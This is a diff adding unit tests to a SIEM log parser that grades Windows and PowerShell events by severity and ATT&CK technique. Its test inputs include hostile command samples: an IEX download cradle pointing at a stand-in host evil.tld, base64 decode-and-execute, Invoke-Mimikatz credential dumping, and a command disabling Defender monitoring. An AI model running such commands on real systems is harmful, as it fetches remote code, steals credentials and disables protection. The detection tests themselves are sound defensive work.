@@ -382,6 +382,12 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
     for (const e of r.events) {
       expect(e.severity).toBe("Low");
       expect(e.mitreTechniques).not.toContain("T1003.001");
+      // ...and NOT the parent technique either. Sysmon EID 10 carries T1003 from the event table
+      // before this branch runs, so downgrading the severity alone left every Defender LSASS scan
+      // in the forensic timeline (Low is at the floor) tagged as credential access — feeding ATT&CK
+      // coverage and synthesis the exact claim the downgrade exists to withdraw. The sibling EID 8
+      // branch already splices T1055 out for the same reason.
+      expect(e.mitreTechniques).not.toContain("T1003");
     }
   });
 
@@ -1220,5 +1226,352 @@ describe("service installation (System 7045)", () => {
       elastic(svc({ ServiceName: "EvilSvc", ServiceFileName: "C:\\Windows\\Temp\\evil.exe" })),
     );
     expect(r.events[0].description).toContain("ServiceFileName=C:\\Windows\\Temp\\evil.exe");
+  });
+
+  // ImagePath reached the DESCRIPTION but none of the structured fields, so a System-log service
+  // install shipped with no `path`, no file IOC and no canonical service executable — while the
+  // Security-log 4697 spelling of the same event shipped all three. Every consumer keyed on the
+  // structured field (path-matching tagger rules, the IOC list, correlation) saw an empty service.
+  it("carries ImagePath into path, the file IOC list, and the canonical service executable", () => {
+    const r = parseSiemExport(
+      elastic(svc({ ServiceName: "EvilSvc", ImagePath: "C:\\Windows\\Temp\\evil.exe" })),
+    );
+    expect(r.events[0].path).toBe("C:\\Windows\\Temp\\evil.exe");
+    expect(r.iocs.map((i) => `${i.type}:${i.value}`)).toContain("file:C:\\Windows\\Temp\\evil.exe");
+    expect(r.events[0].canonical?.service?.executable).toBe("C:\\Windows\\Temp\\evil.exe");
+  });
+
+  // ServiceFileName stays the preferred spelling when a record carries both.
+  it("prefers ServiceFileName over ImagePath when a record carries both", () => {
+    const r = parseSiemExport(
+      elastic(
+        svc({
+          ServiceName: "EvilSvc",
+          ServiceFileName: "C:\\Windows\\Temp\\evil.exe",
+          ImagePath: "C:\\Windows\\Temp\\other.exe",
+        }),
+      ),
+    );
+    expect(r.events[0].path).toBe("C:\\Windows\\Temp\\evil.exe");
+    expect(r.events[0].canonical?.service?.executable).toBe("C:\\Windows\\Temp\\evil.exe");
+  });
+});
+
+// A 4104 arrives at Info because script-block logging is telemetry, not a verdict — and Info is
+// below the forensic floor, so the AI never sees it. That is correct for the bulk of script blocks
+// and wrong for the ones that carry the intrusion: an IEX download cradle or an in-memory Mimikatz
+// invocation was graded by NOTHING. The command line beside it in the same case was graded by three
+// deterministic tables; the script block, which is the same executable content, was graded by none.
+describe("PowerShell script block grading (EID 4104)", () => {
+  const sb = (text: string) => ({
+    "@timestamp": "2026-08-26T13:50:08.000Z",
+    log_name: "Microsoft-Windows-PowerShell/Operational",
+    computer_name: "WKSTN-1",
+    event_id: 4104,
+    event_data: { ScriptBlockText: text },
+  });
+  const graded = (text: string) => parseSiemExport(elastic(sb(text))).events[0];
+
+  it("leaves an ordinary script block at Info with no technique", () => {
+    const e = graded("Get-ChildItem C:\\logs | Measure-Object -Property Length -Sum");
+    expect(e.severity).toBe("Info");
+    expect(e.mitreTechniques).toEqual([]);
+  });
+
+  it("promotes a download cradle to Medium and names PowerShell execution", () => {
+    const e = graded("IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/a.ps1')");
+    expect(e.severity).toBe("Medium");
+    expect(e.mitreTechniques).toContain("T1059.001");
+  });
+
+  it("promotes an encoded / obfuscated block to Medium", () => {
+    expect(graded("$x = [Convert]::FromBase64String($payload); IEX $x").severity).toBe("Medium");
+  });
+
+  it("promotes in-memory credential dumping to High with the credential-access technique", () => {
+    const e = graded("Invoke-Mimikatz -DumpCreds -ComputerName DC01");
+    expect(e.severity).toBe("High");
+    expect(e.mitreTechniques).toContain("T1003");
+    expect(e.mitreTechniques).toContain("T1059.001");
+  });
+
+  it("grades a tradecraft rule inside a script block with that rule's own technique", () => {
+    const e = graded("Set-MpPreference -DisableRealtimeMonitoring $true");
+    expect(e.severity).toBe("High");
+    expect(e.mitreTechniques).toContain("T1562.001");
+  });
+
+  // Discovery is tagged, never promoted on its own — the same call the process branch makes. It
+  // earns its keep on a block that ALSO matched a cradle: that event is Medium and names both.
+  it("tags discovery run from a script block without promoting severity on its own", () => {
+    const e = graded("Get-ADUser -Filter * ; whoami /all ; net group 'Domain Admins' /domain");
+    expect(e.severity).toBe("Info");
+    expect(e.mitreTechniques.length).toBeGreaterThan(0);
+    expect(e.mitreTechniques).not.toContain("T1059.001");
+  });
+});
+
+// 4103 is the OTHER PowerShell diary: 4104 records the script text (ScriptBlockText), 4103 records
+// the command as it actually ran (Payload). Payload was read by nothing — not rendered, not keyed,
+// not graded — so every 4103 on one host shared a description, collapsed into a single row by
+// aggregation, and sat at Info where the AI never sees it.
+describe("PowerShell module/pipeline logging (EID 4103)", () => {
+  const pipeline = (payload: string, host = "WKSTN-1") => ({
+    "@timestamp": "2026-08-26T13:50:08.000Z",
+    log_name: "Microsoft-Windows-PowerShell/Operational",
+    computer_name: host,
+    event_id: 4103,
+    event_data: {
+      ContextInfo: "Severity = Informational\r\n Host Name = ConsoleHost\r\n User = CORP\\jsmith",
+      Payload: payload,
+    },
+  });
+
+  it("renders the command that ran", () => {
+    const r = parseSiemExport(elastic(pipeline('CommandInvocation(Get-Process): "Get-Process"')));
+    expect(r.events[0].description).toContain("Get-Process");
+  });
+
+  it("keeps two different commands on one host as two events", () => {
+    const r = parseSiemExport(
+      elastic(
+        pipeline('CommandInvocation(Get-Process): "Get-Process"'),
+        pipeline('CommandInvocation(Get-Service): "Get-Service"'),
+      ),
+    );
+    expect(r.events).toHaveLength(2);
+  });
+
+  it("leaves an ordinary pipeline record at Info", () => {
+    const r = parseSiemExport(elastic(pipeline('CommandInvocation(Get-Process): "Get-Process"')));
+    expect(r.events[0].severity).toBe("Info");
+    expect(r.events[0].mitreTechniques).toEqual([]);
+  });
+
+  it("grades a download cradle in the payload the same way it grades a script block", () => {
+    const r = parseSiemExport(
+      elastic(
+        pipeline(
+          'CommandInvocation(Invoke-Expression): "Invoke-Expression"\nParameterBinding: value="IEX (New-Object Net.WebClient).DownloadString(\'http://evil.tld/a.ps1\')"',
+        ),
+      ),
+    );
+    expect(r.events[0].severity).toBe("Medium");
+    expect(r.events[0].mitreTechniques).toContain("T1059.001");
+  });
+
+  it("scrapes indicators out of the payload", () => {
+    const r = parseSiemExport(
+      elastic(pipeline('ParameterBinding: name="Uri"; value="http://evil.tld/a.ps1"')),
+    );
+    expect(r.iocs.map((i) => `${i.type}:${i.value}`)).toContain("url:http://evil.tld/a.ps1");
+  });
+});
+
+// A scheduled task, a service, a new account and a group change are the four things every IT
+// department does all day and every attacker does once. Grading all four an unconditional High made
+// the deterministic backfill mint a confidence-100 finding for each — so a fleet running Chrome and
+// Edge auto-updaters produced a stream of "persistence" findings with nothing behind them. Medium is
+// the honest default: still in the forensic timeline, still visible, but no longer auto-promoted to
+// a finding. High is now something the payload has to earn.
+describe("persistence and account events — High is earned, not assumed", () => {
+  const win = (eid: number, data: Record<string, string>, channel = "Security", message = "") => ({
+    "@timestamp": "2026-08-26T13:50:08.000Z",
+    log_name: channel,
+    computer_name: "H1",
+    event_id: eid,
+    ...(message ? { message } : {}),
+    event_data: data,
+  });
+  const sev = (rec: object) => parseSiemExport(elastic(rec)).events[0].severity;
+
+  it("leaves a routine updater service install at Medium", () => {
+    expect(
+      sev(
+        win(
+          7045,
+          {
+            ServiceName: "gupdate",
+            ImagePath: "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /svc",
+          },
+          "System",
+        ),
+      ),
+    ).toBe("Medium");
+  });
+
+  it("still grades a service installed from a staging path High", () => {
+    expect(
+      sev(win(7045, { ServiceName: "EvilSvc", ImagePath: "C:\\Windows\\Temp\\evil.exe" }, "System")),
+    ).toBe("High");
+  });
+
+  it("still grades a PsExec service install High", () => {
+    expect(
+      sev(win(7045, { ServiceName: "PSEXESVC", ImagePath: "%SystemRoot%\\PSEXESVC.exe" }, "System")),
+    ).toBe("High");
+  });
+
+  it("still grades the Security-log spelling of a suspicious service install High", () => {
+    expect(sev(win(4697, { ServiceName: "EvilSvc", ServiceFileName: "C:\\Users\\Public\\p.exe" }))).toBe(
+      "High",
+    );
+  });
+
+  it("leaves a routine scheduled task at Medium", () => {
+    expect(
+      sev(
+        win(
+          4698,
+          { TaskName: "\\Microsoft\\Windows\\UpdateOrchestrator\\Reboot" },
+          "Security",
+          "A scheduled task was created.\n\nTask Name: \\Microsoft\\Windows\\UpdateOrchestrator\\Reboot\nCommand: %systemroot%\\system32\\usoclient.exe",
+        ),
+      ),
+    ).toBe("Medium");
+  });
+
+  it("grades a scheduled task whose action runs from AppData High", () => {
+    expect(
+      sev(
+        win(
+          4698,
+          { TaskName: "\\MicrosoftEdgeUpdateCore" },
+          "Security",
+          "A scheduled task was created.\n\nTask Name: \\MicrosoftEdgeUpdateCore\nCommand: rundll32.exe C:\\Users\\jsmith\\AppData\\Roaming\\update.dll,Start",
+        ),
+      ),
+    ).toBe("High");
+  });
+
+  it("leaves account creation and an ordinary group add at Medium", () => {
+    expect(sev(win(4720, { TargetUserName: "svc_backup" }))).toBe("Medium");
+    expect(sev(win(4732, { TargetUserName: "Users", MemberName: "CN=svc_backup" }))).toBe("Medium");
+  });
+
+  it("grades an add to a privileged group High", () => {
+    expect(sev(win(4728, { TargetUserName: "Domain Admins", MemberName: "CN=jsmith" }))).toBe("High");
+    expect(sev(win(4732, { TargetUserName: "Administrators", MemberName: "CN=jsmith" }))).toBe("High");
+  });
+});
+
+// Defender was the only security product on the benign-actor lists, so on a CrowdStrike or
+// SentinelOne estate the highest-volume telemetry in the case — every agent reading LSASS, every
+// agent injecting an inspection thread — was graded credential access and process injection.
+describe("third-party EDR agents as benign actors", () => {
+  const sysmon = (eid: number, data: Record<string, string>) => ({
+    "@timestamp": "2026-08-26T13:50:08.000Z",
+    log_name: "Microsoft-Windows-Sysmon/Operational",
+    computer_name: "H1",
+    event_id: eid,
+    event_data: data,
+  });
+  const lsass = (src: string) =>
+    parseSiemExport(
+      elastic(sysmon(10, { SourceImage: src, TargetImage: "C:\\Windows\\System32\\lsass.exe" })),
+    ).events[0];
+
+  it("treats a CrowdStrike agent reading LSASS from its own directory as routine", () => {
+    const e = lsass("C:\\Program Files\\CrowdStrike\\CSFalconService.exe");
+    expect(e.severity).toBe("Low");
+    expect(e.mitreTechniques).not.toContain("T1003.001");
+  });
+
+  it("treats a SentinelOne CreateRemoteThread from its own directory as routine", () => {
+    const e = parseSiemExport(
+      elastic(
+        sysmon(8, {
+          SourceImage: "C:\\Program Files\\SentinelOne\\Sentinel Agent 23.1\\SentinelAgent.exe",
+          TargetImage: "C:\\Windows\\explorer.exe",
+        }),
+      ),
+    ).events[0];
+    expect(e.severity).toBe("Low");
+    expect(e.mitreTechniques).not.toContain("T1055");
+  });
+
+  // The name is not the evidence — the install directory is.
+  it("still grades a dumper wearing an EDR agent's name High", () => {
+    expect(lsass("C:\\Windows\\System32\\CSFalconService.exe").severity).toBe("High");
+    expect(lsass("C:\\Users\\Public\\SentinelAgent.exe").severity).toBe("High");
+  });
+
+  // ...and neither is the directory NAME. An attacker can make a folder called CrowdStrike anywhere;
+  // what they cannot do is write into Program Files or System32 without already owning the box. A
+  // vendor match that only checked for '\\CrowdStrike\\' anywhere in the path handed out a Low grade
+  // to any payload staged in a folder of that name — the exact evasion the name check exists to stop.
+  it("rejects an EDR lookalike in a vendor-named folder the attacker created", () => {
+    expect(lsass("C:\\Users\\Public\\CrowdStrike\\CSFalconService.exe").severity).toBe("High");
+    expect(lsass("C:\\Windows\\Temp\\SentinelOne\\SentinelAgent.exe").severity).toBe("High");
+    expect(lsass("C:\\Users\\bob\\Downloads\\Tanium\\TaniumClient.exe").severity).toBe("High");
+  });
+
+  // The guard is only worth having if it still clears the real thing. One canonical install path per
+  // vendor family, plus the two carve-outs that are easy to break: Defender lives under ProgramData
+  // (SUSP_PATH exempts exactly that directory) and CrowdStrike ships a copy under System32\\drivers.
+  it.each([
+    "C:\\Program Files\\CrowdStrike\\CSFalconService.exe",
+    "C:\\Windows\\System32\\drivers\\CrowdStrike\\CSFalconService.exe",
+    "C:\\Program Files\\SentinelOne\\Sentinel Agent 23.1.4\\SentinelAgent.exe",
+    "C:\\Program Files (x86)\\Sophos\\Sophos Endpoint Agent\\SophosEDR.exe",
+    "C:\\Program Files (x86)\\Tanium\\Tanium Client\\TaniumClient.exe",
+    "C:\\Program Files\\Confer\\repmgr.exe",
+    "C:\\Program Files\\Palo Alto Networks\\Traps\\cyserver.exe",
+    "C:\\Program Files\\McAfee\\Agent\\masvc.exe",
+    "C:\\Program Files\\Elastic\\Agent\\elastic-agent.exe",
+    "C:\\Program Files\\Qualys\\QualysAgent\\QualysAgent.exe",
+    "C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection\\ccSvcHst.exe",
+    "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe",
+  ])("clears %s reading LSASS", (image) => {
+    expect(lsass(image).severity).toBe("Low");
+  });
+
+  it("rejects an EDR lookalike run from outside any install root", () => {
+    const e = parseSiemExport(
+      elastic(
+        sysmon(8, {
+          SourceImage: "D:\\staging\\SentinelOne\\SentinelAgent.exe",
+          TargetImage: "C:\\Windows\\explorer.exe",
+        }),
+      ),
+    ).events[0];
+    expect(e.severity).toBe("High");
+    expect(e.mitreTechniques).toContain("T1055");
+  });
+});
+
+// `Payload` is a GENERIC event_data field — PowerShell 4103 uses it for the invoked command, but any
+// provider may use it for anything. Grading it as PowerShell wherever it appears would tag an
+// unrelated Application event T1059.001 for containing a string like IEX.
+describe("script-block grading is scoped to PowerShell records", () => {
+  it("does not grade a non-PowerShell provider's Payload field as PowerShell", () => {
+    const e = parseSiemExport(
+      elastic({
+        "@timestamp": "2026-08-26T13:50:08.000Z",
+        log_name: "Application",
+        computer_name: "H1",
+        event_id: 1000,
+        event_data: {
+          Payload: "IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/a.ps1')",
+        },
+      }),
+    ).events[0];
+    expect(e.severity).toBe("Info");
+    expect(e.mitreTechniques).not.toContain("T1059.001");
+  });
+
+  // ScriptBlockText stays unconditional: the field name is unambiguous, and #652 turns on every
+  // shape that reaches a parsed 4104 — Sigma and DetectRaptor rows included — being graded here.
+  it("still grades a ScriptBlockText carried on an unusual channel", () => {
+    const e = parseSiemExport(
+      elastic({
+        "@timestamp": "2026-08-26T13:50:08.000Z",
+        log_name: "Sigma",
+        computer_name: "H1",
+        event_id: 4104,
+        event_data: { ScriptBlockText: "Invoke-Mimikatz -DumpCreds" },
+      }),
+    ).events[0];
+    expect(e.severity).toBe("High");
   });
 });
